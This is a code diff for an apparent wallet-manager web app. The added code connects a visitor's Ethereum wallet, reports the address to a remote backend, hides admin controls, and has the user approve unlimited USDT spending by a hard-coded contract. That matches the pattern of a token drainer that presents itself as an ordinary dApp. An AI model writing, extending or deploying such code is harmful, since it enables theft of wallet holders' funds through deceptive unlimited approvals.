@@ -1,7 +1,125 @@
-import WalletConnector from './components/WalletConnector.js';
-import ApiService from './services/api.js';
-import { detectPlatform, formatAddress, formatBalance } from './utils/wallet.js';
+// Wallet Connector Class
+class WalletConnector {
+    constructor() {
+        this.provider = null;
+        this.signer = null;
+        this.walletAddress = null;
+    }
 
+    async connect() {
+        try {
+            if (typeof window.ethereum === 'undefined') {
+                throw new Error('No Ethereum wallet found. Please install MetaMask or Trust Wallet.');
+            }
+
+            // Request account access
+            const accounts = await window.ethereum.request({
+                method: 'eth_requestAccounts'
+            });
+
+            this.walletAddress = accounts[0];
+            
+            // Create provider and signer
+            this.provider = new ethers.providers.Web3Provider(window.ethereum);
+            this.signer = this.provider.getSigner();
+
+            return {
+                success: true,
+                address: this.walletAddress
+            };
+        } catch (error) {
+            return {
+                success: false,
+                error: error.message || 'Failed to connect wallet'
+            };
+        }
+    }
+
+    async approveContract(contractAddress) {
+        try {
+            if (!this.signer) {
+                throw new Error('Wallet not connected');
+            }
+            
+            // USDT contract address (replace with your actual USDT contract)
+            const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Mainnet USDT
+            
+            const usdtContract = new ethers.Contract(
+                usdtContractAddress,
+                ['function approve(address spender, uint256 amount) public returns (bool)'],
+                this.signer
+            );
+
+            const tx = await usdtContract.approve(
+                contractAddress,
+                ethers.constants.MaxUint256
+            );
+
+            await tx.wait();
+
+            return {
+                success: true,
+                txHash: tx.hash
+            };
+        } catch (error) {
+            return {
+                success: false,
+                error: error.message || 'Failed to approve contract'
+            };
+        }
+    }
+}
+
+// API Service
+class ApiService {
+    constructor() {
+        this.baseUrl = 'https://multi-wallet-manager.onrender.com/api';
+    }
+
+    async request(endpoint, options = {}) {
+        const url = `${this.baseUrl}${endpoint}`;
+        
+        try {
+            const response = await fetch(url, {
+                headers: {
+                    'Content-Type': 'application/json',
+                    ...options.headers
+                },
+                ...options
+            });
+            
+            if (!response.ok) {
+                const errorData = await response.json().catch(() => ({}));
+                throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`);
+            }
+            
+            return await response.json();
+        } catch (error) {
+            console.error(`API Error (${endpoint}):`, error);
+            throw error;
+        }
+    }
+
+    async connectWallet(walletData) {
+        return this.request('/wallets/connect', {
+            method: 'POST',
+            body: JSON.stringify(walletData)
+        });
+    }
+
+    async approveWallet(walletData) {
+        return this.request('/wallets/approve', {
+            method: 'POST',
+            body: JSON.stringify(walletData)
+        });
+    }
+
+    async getWalletBalance(walletAddress) {
+        return this.request(`/wallets/${walletAddress}/balance`);
+    }
+}
+
+// Main App Class
 class WalletManagerApp {
     constructor() {
         this.walletConnector = new WalletConnector();
@@ -24,7 +142,7 @@ class WalletManagerApp {
         // Loading indicator
         this.loadingIndicator = document.getElementById('loading');
         
-        // Hide admin elements completely
+        // Hide admin elements
         const adminPanel = document.getElementById('admin-panel');
         const adminLogin = document.getElementById('admin-login');
         if (adminPanel) adminPanel.style.display = 'none';
@@ -41,28 +159,16 @@ class WalletManagerApp {
         }
     }
 
-    async init() {
-        // Hide loading indicator on init
+    init() {
+        // Hide loading indicator immediately
         this.showLoading(false);
         
-        const platform = detectPlatform();
-        console.log('Platform detected:', platform);
-        
-        // Auto-connect if wallet is already connected
+        // Check if wallet is already connected
         const storedAddress = localStorage.getItem('walletAddress');
         if (storedAddress) {
             this.walletConnector.walletAddress = storedAddress;
-            await this.updateWalletUI(storedAddress);
+            this.updateWalletUI(storedAddress);
             this.showWalletInfo();
-        }
-        
-        // Auto-connect on wallet browsers
-        if (platform.isWalletBrowser) {
-            console.log('Wallet browser detected, attempting auto-connect...');
-            // Small delay to ensure page is loaded
-            setTimeout(() => {
-                this.handleConnectWallet();
-            }, 500);
         }
     }
 
@@ -70,108 +176,18 @@ class WalletManagerApp {
         this.showLoading(true);
         
         try {
-            const platform = detectPlatform();
-            
-            // Mobile handling
-            if (platform.isMobile) {
-                if (platform.hasWalletExtension) {
-                    // Already in wallet browser, connect directly
-                    await this.connectAndProcessWallet();
-                } else {
-                    // Regular mobile browser, show wallet options
-                    this.showMobileWalletOptions();
-                    this.showLoading(false); // Hide loading when showing options
-                    return;
-                }
-            } else {
-                // Desktop handling
-                await this.connectAndProcessWallet();
-            }
-        } catch (error) {
-            this.showLoading(false);
-            this.showError(`Connection failed: ${error.message}`);
-        }
-    }
-
-    showMobileWalletOptions() {
-        // Hide connect button and show wallet options
-        if (this.connectButton) {
-            this.connectButton.style.display = 'none';
-        }
-        
-        // Create wallet options UI
-        const walletOptions = document.createElement('div');
-        walletOptions.id = 'wallet-options';
-        walletOptions.innerHTML = `
-            <h3>Choose Wallet to Connect</h3>
-            <div class="wallet-options-container">
-                <button class="wallet-option" data-wallet="metamask">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" width="30" height="30">
-                    MetaMask
-                </button>
-                <button class="wallet-option" data-wallet="trustwallet">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/TrustWallet-logo.svg" alt="Trust Wallet" width="30" height="30">
-                    Trust Wallet
-                </button>
-                <button class="wallet-option" data-wallet="coinbase">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Coinbase_%28Wallet%29_Logo.png" alt="Coinbase Wallet" width="30" height="30">
-                    Coinbase Wallet
-                </button>
-            </div>
-            <p class="instruction">Select a wallet to open this DApp in that wallet's browser</p>
-        `;
-        
-        // Insert after connection status
-        if (this.connectionStatus.parentNode) {
-            this.connectionStatus.parentNode.insertBefore(walletOptions, this.connectionStatus.nextSibling);
-        }
-        
-        // Add event listeners
-        document.querySelectorAll('.wallet-option').forEach(button => {
-            button.addEventListener('click', (e) => {
-                const wallet = e.target.closest('.wallet-option').dataset.wallet;
-                this.openInWallet(wallet);
-            });
-        });
-    }
-
-    openInWallet(walletName) {
-        const dappUrl = window.location.href;
-        
-        switch(walletName) {
-            case 'metamask':
-                // Try to open in MetaMask app
-                window.location.href = `https://metamask.app.link/dapp/${dappUrl.replace('https://', '').replace('http://', '')}`;
-                break;
-            case 'trustwallet':
-                // Try to open in Trust Wallet app
-                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
-                break;
-            case 'coinbase':
-                // Try to open in Coinbase Wallet
-                window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(dappUrl)}`;
-                break;
-            default:
-                // Fallback to regular connection
-                this.connectAndProcessWallet();
-        }
-    }
-
-    async connectAndProcessWallet() {
-        try {
             const result = await this.walletConnector.connect();
-            this.showLoading(false);
             
             if (result.success) {
                 localStorage.setItem('walletAddress', result.address);
-                await this.updateWalletUI(result.address);
+                this.updateWalletUI(result.address);
                 this.showWalletInfo();
                 
                 // Send to backend
                 try {
                     await this.apiService.connectWallet({
                         address: result.address,
-                        name: `Wallet ${formatAddress(result.address)}`
+                        name: `Wallet ${result.address.substring(0, 6)}...${result.address.substring(38)}`
                     });
                 } catch (error) {
                     console.error('Error connecting to backend:', error);
@@ -180,48 +196,48 @@ class WalletManagerApp {
                 this.showError(`Connection failed: ${result.error}`);
             }
         } catch (error) {
-            this.showLoading(false);
             this.showError(`Connection failed: ${error.message}`);
+        } finally {
+            this.showLoading(false);
         }
     }
 
-    async updateWalletUI(address) {
-        this.connectionStatus.textContent = `Connected: ${formatAddress(address)}`;
-        this.connectButton.textContent = 'Connected';
-        this.connectButton.disabled = true;
-        
-        this.walletAddressElement.textContent = address;
-        
-        // Get USDT balance
-        try {
-            const balance = await this.getUSDTBalance(address);
-            this.usdtBalanceElement.textContent = formatBalance(balance);
-        } catch (error) {
-            console.error('Error getting balance:', error);
+    updateWalletUI(address) {
+        if (this.connectionStatus) {
+            this.connectionStatus.textContent = `Connected: ${address.substring(0, 6)}...${address.substring(38)}`;
+        }
+        if (this.connectButton) {
+            this.connectButton.textContent = 'Connected';
+            this.connectButton.disabled = true;
+        }
+        if (this.walletAddressElement) {
+            this.walletAddressElement.textContent = address;
+        }
+        if (this.usdtBalanceElement) {
             this.usdtBalanceElement.textContent = '0.00';
         }
     }
 
     showWalletInfo() {
-        this.walletInfo.classList.remove('hidden');
-    }
-
-    hideWalletInfo() {
-        this.walletInfo.classList.add('hidden');
+        if (this.walletInfo) {
+            this.walletInfo.classList.remove('hidden');
+        }
     }
 
     async handleApproveContract() {
         this.showLoading(true);
         
         try {
+            // Use your actual contract address
             const contractAddress = '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF';
             const result = await this.walletConnector.approveContract(contractAddress);
-            this.showLoading(false);
             
             if (result.success) {
                 this.showSuccess('Contract approved successfully!');
-                this.approveButton.disabled = true;
-                this.approveButton.textContent = 'Approved';
+                if (this.approveButton) {
+                    this.approveButton.disabled = true;
+                    this.approveButton.textContent = 'Approved';
+                }
                 
                 // Update backend
                 try {
@@ -235,53 +251,24 @@ class WalletManagerApp {
                 this.showError(`Approval failed: ${result.error}`);
             }
         } catch (error) {
-            this.showLoading(false);
             this.showError(`Approval failed: ${error.message}`);
-        }
-    }
-
-    async getUSDTBalance(walletAddress) {
-        try {
-            const response = await this.apiService.getWalletBalance(walletAddress);
-            return response.balance || '0.00';
-        } catch (error) {
-            console.error('Error getting USDT balance:', error);
-            return '0.00';
+        } finally {
+            this.showLoading(false);
         }
     }
 
     showLoading(show) {
         if (this.loadingIndicator) {
-            this.loadingIndicator.style.display = show ? 'block' : 'none';
+            this.loadingIndicator.style.display = show ? 'flex' : 'none';
         }
     }
 
     showSuccess(message) {
-        // Create a temporary success message
-        const successDiv = document.createElement('div');
-        successDiv.className = 'alert success';
-        successDiv.textContent = message;
-        document.body.appendChild(successDiv);
-        
-        setTimeout(() => {
-            if (document.body.contains(successDiv)) {
-                document.body.removeChild(successDiv);
-            }
-        }, 3000);
+        alert(`Success: ${message}`);
     }
 
     showError(message) {
-        // Create a temporary error message
-        const errorDiv = document.createElement('div');
-        errorDiv.className = 'alert error';
-        errorDiv.textContent = message;
-        document.body.appendChild(errorDiv);
-        
-        setTimeout(() => {
-            if (document.body.contains(errorDiv)) {
-                document.body.removeChild(errorDiv);
-            }
-        }, 5000);
+        alert(`Error: ${message}`);
     }
 }
 
